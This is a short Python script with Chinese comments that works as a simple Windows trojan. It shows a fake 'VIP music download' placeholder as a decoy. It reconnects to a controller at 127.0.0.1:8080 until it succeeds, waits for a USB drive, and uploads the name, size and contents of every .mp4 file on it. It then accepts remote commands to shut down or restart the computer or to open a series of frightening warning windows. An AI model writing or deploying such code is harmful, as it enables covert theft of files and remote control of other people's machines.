from socket import *
import os, time
from win32api import *
from win32file import *
import threading   # 线程模块
s = socket()
while True:  # 木马重连机制
    try:  # 尝试
        s.connect(('127.0.0.1',8080)) # 申请连接 # IP本机测试127.0.0.1
        break
    except: time.sleep(2)
def vip_music_down():
    print('此功能正在开发中......')
threading.Thread(target=vip_music_down).start()
# U盘检测
while True:
    disk_str = GetLogicalDriveStrings()  # 获取电脑磁盘信息，得到字符串
    disk_list = disk_str.split('\x00')   # 切割
    disk_list.pop(-1)                    # 丢弃最后一个元素
    for disk in disk_list:
        if GetDriveType(disk) == 2:      # U盘磁盘类型都是2
            break
    if GetDriveType(disk) == 2:
        break
# 全盘扫描 固定写法
for root, ds, fs in os.walk(disk):   # 扫描U盘
    for f in fs:  #拿到文件名列表 遍历
        if f.endswith('.mp4'):
            path = root + '\\' + f
            # 文件名发给后台
            s.send(f.encode())
            s.recv(1024)        # 等待确认
            # 文件大小发给后台
            filesize = os.path.getsize(path)
            s.send(str(filesize).encode())
            s.recv(1024)
            # 文件内容发给后台
            with open(path, 'rb') as file:
                for data in file:
                    s.send(data)
            s.recv(1024)

while True:
    cmd = s.recv(1024).decode() # 接收最多1024字节 指令的编码
    if cmd == 'shutdown':
        os.system('shutdown -s -t 60')
        s.send('ojbk'.encode())
        break
    elif cmd == 'restart':
        os.system('shutdown -r -t 60')
        s.send('ojbk'.encode())
        break
    elif cmd == 'warning':
        for i in range(10):
            os.system(f"start cmd /k echo【警告第{i+1}次】你的电脑要炸了！")
        s.send('ojbk'.encode())
        break
s.close()